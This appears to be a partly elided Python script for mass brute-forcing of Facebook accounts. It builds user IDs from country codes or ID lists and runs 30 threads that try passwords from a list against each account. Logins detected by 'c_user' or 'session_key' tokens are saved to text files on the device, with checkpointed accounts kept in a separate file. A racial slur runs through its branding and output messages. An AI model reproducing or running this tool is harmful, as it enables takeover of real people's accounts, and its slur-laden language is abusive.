...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse Airlpane mode for speed up\033[1;37m")
                        linex()
                        for user in id:
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if PRO in ['1','01']:
                                ...
                                exit(' Thanks for Using Nigga TOOL 🥰 ')
                        else:
                        ...
                        linex()
                        tks = ("Hi Mr Nigga Approve My Key!:)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Niga.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                with tred(max_workers=30) as PRO:     
                        ...
                        print(f'\033[1;37m \x1b[38;5;208mUse Airlplane mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as PRO:     
                        ...
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse Airplane mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def gmail():
                ...
                with tred(max_workers=30) as PRO:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse Airplane mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [NIGGA-PRO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in PRO:
                                ...
                                print('\r\r\033[1;32m [NIGGA-OK] %s | %s'%(ids,pas))
                                open('/sdcard/NIGGA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in PRO:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [NIGGA-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NIGGA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [NIGGA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NIGGA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/NIGGA-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [NIGGA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/NIGGA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [NIGGA-OK] '+uid+' | '+pas+'\033[1;97m')
